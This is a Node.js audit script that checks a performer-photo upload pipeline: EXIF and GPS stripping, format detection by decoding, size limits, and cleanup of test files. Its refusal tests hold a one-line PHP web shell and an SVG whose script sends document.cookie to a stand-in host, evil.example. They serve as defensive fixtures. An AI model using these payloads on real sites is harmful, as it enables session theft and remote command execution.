/**
 * What happens to a performer's photo between their phone and our disk.
 *
 * Offline and self-contained: it builds its own fixtures, calls the real
 * processPhoto(), and deletes what it wrote. No database, no HTTP, nothing to
 * clean up afterwards — so it is safe to run any time, including against a
 * checkout whose .env points at production.
 *
 *   node scripts/audit-talent-photo.js
 *
 * The three things worth re-proving whenever this code is touched:
 *   1. EXIF does not survive  — a phone photo carries the GPS coordinates of
 *      wherever it was taken, and we publish these pictures.
 *   2. Format is decided by DECODING, never by the name or the Content-Type.
 *      A .jpg holding PHP, and a perfectly valid SVG with a <script> in it,
 *      must both be refused.
 *   3. The limits are real, and the error a performer sees explains itself.
 */
import fs from 'fs';
import os from 'os';
import path from 'path';
import sharp from 'sharp';
import { processPhoto, ACCEPTED, MAX_PHOTO_BYTES, MAX_PHOTOS_PER_LINK } from '../lib/talentPhoto.js';
import { MEDIA_DIR, filesFor } from '../lib/mediaVariants.js';

let pass = 0, fail = 0;
const ok = (cond, what, note = '') => {
  cond ? pass++ : fail++;
  console.log(`  ${cond ? 'ok  ' : 'FAIL'} ${what}${note ? ` — ${note}` : ''}`);
};
const written = [];

/** Run processPhoto and remember the files so we can take them away again. */
async function run(buf, hint) {
  const out = await processPhoto(buf, { nameHint: hint });
  written.push(out);
  return out;
}
const refused = async (buf, hint) => {
  try { await run(buf, hint); return null; } catch (e) { return e.message; }
};

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'talent-photo-'));
try {
  console.log('\nA photo straight off a phone');
  const phone = await sharp({ create: { width: 3024, height: 4032, channels: 3, background: '#7a5236' } })
    .jpeg({ quality: 88 })
    .withExif({
      IFD0: { Make: 'Apple', Model: 'iPhone 15 Pro' },
      IFD2: { GPSLatitudeRef: 'N', GPSLatitude: '43/1 36/1 5/1', GPSLongitudeRef: 'W', GPSLongitude: '116/1 12/1 10/1' },
    })
    .toBuffer();
  const before = await sharp(phone).metadata();
  ok(before.exif?.length > 0, 'the fixture really does carry EXIF to begin with', `${before.exif?.length || 0} bytes`);

  const out = await run(phone, 'Some Band');
  const after = await sharp(path.join(MEDIA_DIR, out.filename)).metadata();
  ok(!after.exif, 'EXIF is gone, and the GPS tag with it');
  ok(after.format === 'jpeg', 're-encoded as JPEG rather than stored as sent');
  ok(after.width <= 1600 && after.height <= 1600, `downscaled inside 1600px`, `${after.width}x${after.height}`);
  ok(/^some-band-\d+\.jpg$/.test(out.filename), 'named after the act, not after their file', out.filename);
  ok(out.size_bytes < phone.length, 'smaller than what they sent',
     `${(phone.length / 1024).toFixed(0)}KB → ${(out.size_bytes / 1024).toFixed(0)}KB`);
  ok(Array.isArray(out.variants?.webp) && out.variants.webp.length > 0, 'responsive variants generated',
     `${out.variants?.webp?.length || 0} webp / ${out.variants?.avif?.length || 0} avif`);

  console.log('\nA sideways photo');
  const sideways = await sharp({ create: { width: 1600, height: 900, channels: 3, background: '#406070' } })
    .jpeg().withExif({ IFD0: { Orientation: '6' } }).toBuffer();
  const rot = await run(sideways, 'Sideways');
  ok(rot.width > 0 && rot.height > 0, 'still decodes with an orientation tag set',
     `${rot.width}x${rot.height}`);

  console.log('\nWhat must be refused');
  ok(await refused(Buffer.from('<?php system($_GET["c"]); ?>'), 'php'),
     'a PHP script named like a photo');

  const svg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">' +
    '<script>fetch("https://evil.example/"+document.cookie)</script></svg>');
  const svgMeta = await sharp(svg).metadata();
  ok(svgMeta.format === 'svg', 'the SVG fixture is one sharp would happily decode');
  ok(!ACCEPTED.includes('svg'), 'SVG is not on the accept list');
  const svgErr = await refused(svg, 'svg');
  ok(svgErr && /SVG/i.test(svgErr), 'a valid SVG with a script in it', svgErr);

  const tiny = await sharp({ create: { width: 80, height: 80, channels: 3, background: '#222' } }).png().toBuffer();
  ok(await refused(tiny, 'tiny'), 'an 80px image');

  ok(await refused(Buffer.alloc(0), 'empty'), 'an empty upload');

  console.log('\nWhat must be accepted');
  for (const fmt of ['png', 'webp', 'gif']) {
    const buf = await sharp({ create: { width: 900, height: 900, channels: 3, background: '#555' } })
      .toFormat(fmt).toBuffer();
    try { await run(buf, `fmt ${fmt}`); ok(true, `a ${fmt.toUpperCase()} photo`); }
    catch (e) { ok(false, `a ${fmt.toUpperCase()} photo`, e.message); }
  }

  console.log('\nThe stated limits');
  ok(MAX_PHOTO_BYTES === 10 * 1024 * 1024, 'size ceiling is 10MB', `${MAX_PHOTO_BYTES} bytes`);
  ok(MAX_PHOTOS_PER_LINK === 3, 'three photos per link');
  ok(!ACCEPTED.includes('svg') && !ACCEPTED.includes('tiff'),
     'the accept list stays narrow', ACCEPTED.join(', '));
} finally {
  // Take back everything this wrote, originals and variants alike.
  let removed = 0;
  for (const out of written) {
    for (const f of filesFor({ filename: out.filename, variants: out.variants })) {
      const p = path.join(MEDIA_DIR, f);
      if (fs.existsSync(p)) { fs.unlinkSync(p); removed++; }
    }
  }
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(`\n${removed} test files cleaned up.`);
}

console.log(`${pass} passed, ${fail} failed\n`);
process.exit(fail ? 1 : 0);
